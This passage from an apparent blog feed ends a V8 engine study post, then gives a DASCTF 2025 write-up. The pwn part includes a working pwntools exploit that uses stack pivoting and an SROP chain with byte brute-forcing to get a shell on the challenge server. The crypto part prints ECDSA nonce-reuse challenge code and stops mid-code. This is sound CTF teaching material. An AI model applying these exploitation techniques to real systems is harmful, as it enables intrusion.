v8发展</h2><ul><li>2008年<code>V8</code>发布了第一个版本，其性能远超同时期其他<code>js</code>解释器，例如：<code>SpiderMonkey</code>、<code>JavaScriptCore</code>。但是此时的<code>V8</code>是直接将<code>js</code>源码直接编译成机器码再执行，此时<code>v8</code>只有<code>Codegen</code>一个编译器，对于代码优化功能比较有限。（具体的过程先不深究）</li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013005547390.png" alt="image-20251013005547390"></p><ul><li>2010年<code>v8</code>发布了另一个编译器，也就是<code>Crankshaft</code>编译器。其工作原理如下：<ul><li><code>Js</code>函数通常会被<code>Full-Codegen</code>编译</li><li>如果后续该函数会被多次执行，那么就会用<code>Crankshaft</code>再重新编译，生产优化代码。但是<code>Crankshaft</code>对代码的优化有限</li></ul></li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013082414157.png" alt="image-20251013082414157"></p><ul><li>2015年<code>v8</code>又再发布了一个<code>优化编译器</code>，<code>TurboFan</code>。此时的<code>v8</code>依旧是将源码编译为机器码的架构。这个架构存在的一个问题就是内存消耗较大，尤其是在移动设备上。</li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013082838403.png" alt="image-20251013082838403"></p><ul><li>2016年<code>v8</code>的架构开始改变，引入了<code>Ignition</code>解释器，重新引入字节码，减少内存使用。</li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013082926474.png" alt="image-20251013082926474"></p><ul><li>2017年<code>v8</code>发布全新编译的<code>pipeline</code>，其架构如下图所示。<ul><li>从<code>v8 5.9</code>版本去除了<code>Full-Codegen</code>以及<code>Crankshaft</code>编译器。</li><li>现在这个架构最核心有三个，分别是<strong>解析器</strong>、<strong>解释器</strong>、<strong>优化编译器</strong></li><li>简单介绍一下该架构下<code>js</code>的执行过程，首先解析器会将<code>js</code>代码解析成抽象语法树（AST），解释器再将（AST）翻译为字节码边解释边执行。</li><li>在解释过程中，解释器还提供记录特定代码片段运行次数的功能，当特定代码运行次数达到一定程度时，会将该代码片段标记为<strong>热代码</strong>，并反馈给优化编译器<code>TurboFan</code>。</li><li><code>TurboFan</code>根据反馈信息<strong>优化并编译字节码</strong>，最终生成机器码，当再次执行该段代码时，就会直接使用优化后的机器码。</li></ul></li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013083039441.png" alt="image-20251013083039441"></p><h2 id="chrome-v8版本号"><a href="#Chrome-v8版本号" class="headerlink" title="Chrome v8版本号"></a>Chrome v8版本号</h2><ul><li>直接打开<code>谷歌浏览器</code>，输入网址<code>chrome://version/</code>，会看到<code>V8</code>的版本以及谷歌浏览器的版本。<code>V8</code>的版本号定义形如<code>x.y.z.w</code><ul><li>其中<code>x.y</code>是由谷歌浏览器的主版本号除以<code>10</code>得到的，比如图中的谷歌浏览器主版本号为<code>143</code>除以<code>10</code>就是<code>14.3</code>。</li><li>而<code>z</code>每出现新的 <strong>LKGR</strong>（Last Known Good Revision）（最后一个已知良好版本）时自动递增。</li><li>而<code>w</code>分支点后回合并补丁次数（其实就相当于补丁号）</li></ul></li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251014155741323.png" alt="image-20251014155741323"></p><h2 id="parser解析器"><a href="#Parser解析器" class="headerlink" title="Parser解析器"></a>Parser解析器</h2><h2 id="ignition解释器"><a href="#Ignition解释器" class="headerlink" title="Ignition解释器"></a>Ignition解释器</h2><h2 id="turbofan优化编译器"><a href="#TurboFan优化编译器" class="headerlink" title="TurboFan优化编译器"></a>TurboFan优化编译器</h2><h1 id="chrome-v8项目文件架构"><a href="#Chrome-V8项目文件架构" class="headerlink" title="Chrome V8项目文件架构"></a>Chrome V8项目文件架构</h1>]]></content>
    
    
    <summary type="html">前言：v8是个大项目，没有v8基础去找洞和做题，我不会，遂学习。</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="v8" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/v8/"/>
    
    
  </entry>
  
  <entry>
    <title>DASCTF2025上半年赛</title>
    <link href="http://iyheart.github.io/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/"/>
    <id>http://iyheart.github.io/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/</id>
    <published>2025-10-12T12:10:05.000Z</published>
    <updated>2025-10-12T12:23:03.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="mini"><a href="#mini" class="headerlink" title="mini"></a>mini</h2><ul><li><p>考点：<code>only-read</code></p></li><li><p>这题与<code>ACTF</code>的那题是一样的题型都是<code>only-read</code>的题型，只不过这题溢出的字节数非常小，只有<code>0x20</code>字节，而<code>ACTF</code>那题溢出的字节数非常大。</p></li><li><p>先来查看一下程序保护机制。没有开启<code>PIE</code>和<code>canary found</code>。</p></li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623013520561.png" alt="image-20250623013520561"></p><ul><li>然后查看一下这个程序的主要代码，发现只能溢出到<code>ret</code>这个部分。所以这题必须栈迁移。</li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623013611664.png" alt="image-20250623013611664"></p><ul><li>此时还发现了<code>pop rax ret</code>这个<code>gadget</code>，那这题的思路还是比较明显的，思路为<code>ret2syscall</code>利用<code>SROP</code>从而<code>getshell</code>，返回到的是<code>__libc_start_call_main</code>这个函数中的一个<code>syscall</code>。</li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623013712291.png" alt="image-20250623013712291"></p><ul><li>首先我们先来栈迁移，将栈内存迁移到<code>bss</code>段中，但是由于<code>bss</code>段上还没有<code>libc</code>地址，所以此时迁移之后还需要返回到<code>_start</code>将程序从头开始运行，这时<code>bss</code>段上就有相关的数据。如下图：</li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623014811504.png" alt="image-20250623014811504"></p><ul><li>但是由于先要通过溢出才能构造<code>SROP链</code>，并且溢出必然会覆盖<code>__libc_Start_call_main</code>这个函数的地址。但是注意到<code>__libc_start_main+133</code>这边是在<code>__libc_start_call_main</code>函数的附件，这样其实就选择使用<code>爆破1</code>个字节来得到返回到<code>__libc_start_call_main</code>那边的<code>syscall</code>。</li><li>但是在执行之前，需要先在<code>__libc_start_main+133</code>后面的地址处布置好<code>srop</code>所需要的数据。但是由于溢出字节不够，我们只每次<code>0x10</code>字节将<code>SROP</code>链写入到bss段中。</li><li>这里要解释一下为什么写完要跳到<code>bss_addr-0x250</code>这边，其实是为了让<code>rsi</code>跑远一点不能与<code>rsp</code>小<code>0x10</code>字节（<strong>这个地方后面还需要用到</strong>），如果<code>rsi=rsp-0x10</code>，程序会在<code>read</code>调用之后，从<code>rsi</code>所指地址中写入数据，此时就会覆盖<code>call read</code>时压入栈上的返回地址，导致程序出现问题。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_srop</span>(<span class="params">i</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr-<span class="number">0xA0</span>+<span class="number">0x10</span>+i*<span class="number">0x10</span>)</span><br><span class="line">        payload+= p64(main_read)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        payload = <span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*i:i*<span class="number">0x10</span>+<span class="number">0x10</span>]+p64(bss_addr-<span class="number">0x250</span>)</span><br><span class="line">        payload += p64(main_read)</span><br><span class="line">        p.send(payload)</span><br></pre></td></tr></table></figure><ul><li>布置srop的结构如下，并且布置完srop后的栈图如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = bss_addr-<span class="number">0xb8</span>+<span class="number">0x10</span>-<span class="number">0x8</span>-<span class="number">0x10</span></span><br><span class="line">frame.rbp = bss_addr + <span class="number">0x20</span></span><br><span class="line">frame.rsp = <span class="number">0x404578</span></span><br><span class="line">frame.rip = <span class="number">0x40114F</span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623020638831.png" alt="image-20250623020638831"></p><ul><li>布置完后，我们就需要步骤<code>rop</code>链，将系统调用号<code>15</code>给<code>rax</code>，但是我们要通过正常溢出是不可能的，此时我们就需要通过前面<code>read</code>的那个<strong>小技巧</strong>这样才能同时构造<code>rop</code>链，并且还能溢出修改<code>0x2</code>个字节将<code>__libc_start_main+133</code>修改为<code>__libc_start_call_main</code>处的那个<code>syscall</code>。</li><li>所以最后一次返回的时候，我们要满足<code>rsp=rbp</code>并且<code>rsi=rsp-0x10</code>,在没有调用<code>read</code>的时候栈布局是这样的。</li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021303529.png" alt="image-20250623021303529"></p><ul><li>在调用read之后写入数据，还没返回时，栈布局是这样的。</li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021403899.png" alt="image-20250623021403899"></p><ul><li>所以调用<code>read</code>从<code>rsi</code>开始写数据的时候，就会先将<code>ret_addr</code>给覆盖了，我们就可以提前布置<code>rop</code>链将<code>ret_addr</code>布置成<code>pop_rax ret</code>，之后再将<code>ccc</code>修改成<code>15</code>，最后修改<code>ret_addr</code>的最后两个字节，其中我们需要爆破<code>4位</code>。构造之后的栈布局如下：</li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021623074.png" alt="image-20250623021623074"></p><ul><li>这样我们其实就能getshell了，这里在打本地的时候关闭了<code>ASLR</code></li></ul><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021646015.png" alt="image-20250623021646015"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29433</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    bss_addr = <span class="number">0x404018</span>+<span class="number">0x600</span>+<span class="number">0x8</span></span><br><span class="line">    main_read = <span class="number">0x401133</span></span><br><span class="line">    start_addr = <span class="number">0x401040</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr) + p64(main_read)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a*0x10+ p64(bss_addr) + p64(main_read)&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(bss_addr-<span class="number">0x50</span>) + p64(main_read)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a*0x10+p64(bss_addr-0x50) + p64(main_read)&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(bss_addr-<span class="number">0x90</span>) + p64(start_addr)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#payload = b&#x27;a&#x27;*0x10 + p64(bss_addr-0x90) + p64()</span></span><br><span class="line">    <span class="comment">#p.send(payload)</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">59</span></span><br><span class="line">    frame.rdi = bss_addr-<span class="number">0xb8</span>+<span class="number">0x10</span>-<span class="number">0x8</span>-<span class="number">0x10</span></span><br><span class="line">    frame.rbp = bss_addr + <span class="number">0x20</span></span><br><span class="line">    frame.rsp = <span class="number">0x404578</span></span><br><span class="line">    frame.rip = <span class="number">0x40114F</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(frame))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(frame)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bytes</span>(frame)[<span class="number">0</span>:<span class="number">8</span>]))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_srop</span>(<span class="params">i</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr-<span class="number">0xA0</span>+<span class="number">0x10</span>+i*<span class="number">0x10</span>)</span><br><span class="line">        payload+= p64(main_read)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        payload = <span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*i:i*<span class="number">0x10</span>+<span class="number">0x10</span>]+p64(bss_addr-<span class="number">0x250</span>)</span><br><span class="line">        payload += p64(main_read)</span><br><span class="line">        p.send(payload)</span><br><span class="line">    my_srop(<span class="number">0</span>)</span><br><span class="line">    my_srop(<span class="number">1</span>)</span><br><span class="line">    my_srop(<span class="number">2</span>)</span><br><span class="line">    my_srop(<span class="number">3</span>)</span><br><span class="line">    my_srop(<span class="number">4</span>)</span><br><span class="line">    my_srop(<span class="number">5</span>)</span><br><span class="line">    my_srop(<span class="number">6</span>)</span><br><span class="line">    my_srop(<span class="number">7</span>)</span><br><span class="line">    my_srop(<span class="number">8</span>)</span><br><span class="line">    my_srop(<span class="number">9</span>)</span><br><span class="line">    my_srop(<span class="number">0xa</span>)</span><br><span class="line">    my_srop(<span class="number">0xb</span>)</span><br><span class="line">    my_srop(<span class="number">0xc</span>)</span><br><span class="line">    my_srop(<span class="number">0xd</span>)</span><br><span class="line">    my_srop(<span class="number">0xe</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*<span class="number">0xf</span>:])</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr-<span class="number">0xA0</span>+<span class="number">0x10</span>+<span class="number">0xf</span>*<span class="number">0x10</span>)</span><br><span class="line">    payload+= p64(main_read)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*<span class="number">0xf</span>:]+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr-<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(main_read)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr-<span class="number">0xb8</span>-<span class="number">0x8</span>)+p64(main_read)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(bss_addr-<span class="number">0xb8</span>+<span class="number">0x10</span>-<span class="number">0x8</span>) + p64(main_read)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x401126</span>) + p64(<span class="number">15</span>)+p16(<span class="number">0x3D94</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><ul><li>远程爆破的话还是比较好爆破的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;5738e34c-<span class="number">70e8</span>-45cf-abc7-ff4eb2265229&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/10/12/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021945654.png" alt="image-20250623021945654"></p><h2 id="nsusserver"><a href="#NSUSServer" class="headerlink" title="NSUSServer"></a>NSUSServer</h2><h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="excessive-security复现"><a href="#Excessive-Security-复现" class="headerlink" title="Excessive Security(复现)"></a>Excessive Security(复现)</h2><ul><li><p>考点：<code>ecdsa</code></p></li><li><p>参考博客：<a href="https://triodelzx.github.io/">Triode Field</a></p></li><li><p>题目如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, bytes_to_long, getPrime</span><br><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;test&#125;&#x27;</span></span><br><span class="line">curve = SECP256k1  <span class="comment"># 使用的是特殊的椭圆曲线,其中G其实已知、p也其实已知、n也就是阶也已知</span></span><br><span class="line">G, n = curve.generator, curve.order</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="built_in">print</span>(curve.curve)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">H</span>(<span class="params">msg</span>): <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(sha256(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">h, priv, k</span>): <span class="comment"># 进行签名操作</span></span><br><span class="line">    r = (k * G).x() % n</span><br><span class="line">    s = (inverse(k, n) * (h + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> s, r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split</span>(<span class="params">data</span>):</span><br><span class="line">    s = data.decode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>) <span class="keyword">else</span> data</span><br><span class="line">    <span class="keyword">return</span> [s[i::<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    blocks = split(plaintext)   <span class="comment"># 切割flag</span></span><br><span class="line">    h = <span class="built_in">list</span>(<span class="built_in">map</span>(H, blocks))    <span class="comment"># 调用H(flag1)、H(flag2)、H(flag3)、H(flag4),将返回的值组成一个列表</span></span><br><span class="line"></span><br><span class="line">    x1 = randint(<span class="number">1</span>, n - <span class="number">1</span>)      <span class="comment"># 生成随机数x1</span></span><br><span class="line">    x2 = randint(<span class="number">1</span>, n - <span class="number">1</span>)      <span class="comment"># 生成随机数x2</span></span><br><span class="line">    k1 = randint(n // <span class="number">8</span>, n - <span class="number">1</span>) <span class="comment"># 生成随机数k1</span></span><br><span class="line">    k2 = randint(n // <span class="number">8</span>, n - <span class="number">1</span>) <span class="comment"># 生成随机数k2</span></span><br><span class="line"></span><br><span class="line">    s1, r1 = sign(h[<span class="number">0</span>], x1, k1) <span class="comment"># 对h[0]进行椭圆曲线数字签名</span></span><br><span class="line">    s2, _  = sign(h[<span class="number">1</span>], x2, k1) <span class="comment"># 对h[1]进行椭圆曲线数字签名</span></span><br><span class="line">    s3, r2 = sign(h[<span class="number">2</span>], x1, k2) <span class="comment"># 对h[2]进行椭圆曲线数字签名</span></span><br><span class="line">    s4, _  = sign(h[<span class="number">3</span>], x2, k2) <span class="comment"># 对h[3]进行椭圆曲线签名</span></span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(plaintext)</span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c1 = <span class="built_in">pow</span>(m, e, N) <span class="comment"># 进行一次RSA加密</span></span><br><span class="line">    c2 = <span class="built_in">pow</span>(x1 * m + x2, e, N)  <span class="comment"># 对x1和x2配合m也进行一次RSA加密</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h1, s1, r1) = (<span class="subst">&#123;h[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;s1&#125;</span>, <span class="subst">&#123;r1&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h2, s2, r1) = (<span class="subst">&#123;h[<span class="number">1</span>]&#125;</span>, <span class="subst">&#123;s2&#125;</span>, <span class="subst">&#123;r1&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h3, s3, r2) = (<span class="subst">&#123;h[<span class="number">2</span>]&#125;</span>, <span class="subst">&#123;s3&#125;</span>, <span class="subst">&#123;r2&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h4, s4, r2) = (<span class="subst">&#123;h[<span class="number">3</span>]&#125;</span>, <span class="subst">&#123;s4&#125;</span>, <span class="subst">&#123;r2&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sign_encrypt(flag)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># N = 98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span></span><br><span class="line">    <span class="comment"># c1 = 40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span></span><br><span class="line">    <span class="comment"># c2 = 4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span></span><br><span class="line">    <span class="comment"># (h1, s1, r1) = (68926494835039378729440404424793589316085902585443402029912033361291851069895, 70264613994433317101824708333691569351293428290775945022557096997867421112623, 95467825458659408375936425122753380788640181504557006906236884175684680903422)</span></span><br><span class="line">    <span class="comment"># (h2, s2, r1) = (99816429822339421445908151468618514820067970997726274244928092260385418279182, 27386247988345867998752358066350183725137348277248603318763377237810993039608, 95467825458659408375936425122753380788640181504557006906236884175684680903422)</span></span><br><span class="line">    <span class="comment"># (h3, s3, r2) = (100471089356874379799029324099340355602511511524623953182021635156113287196537, 108271537842404710192407976239166854351892165018292127464175836717873395489565, 13940715298251935708383205669373172931583958487449924842542107474174521484127)</span></span><br><span class="line">    <span class="comment"># (h4, s4, r2) = (53552261622392134420510144174810499568173979993026285111445672642139328877380, 100312693542625967610858608130705401648902828203826044299984002070083890684220, 13940715298251935708383205669373172931583958487449924842542107474174521484127)</span></span><br></pre></td></tr></table></figure><ul><li>这题主要考察的就是<code>ECDSA</code>，首先生成了一个椭圆曲线，这个椭圆曲线的各个参数都已知：</li></ul><script type="math/tex; mode=display">curve:y^2=x^3+7~mod~(115792089237316195423570985008687907853269984665640564039457584007908834671663)\\order:n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curve = SECP256k1  <span class="comment"># 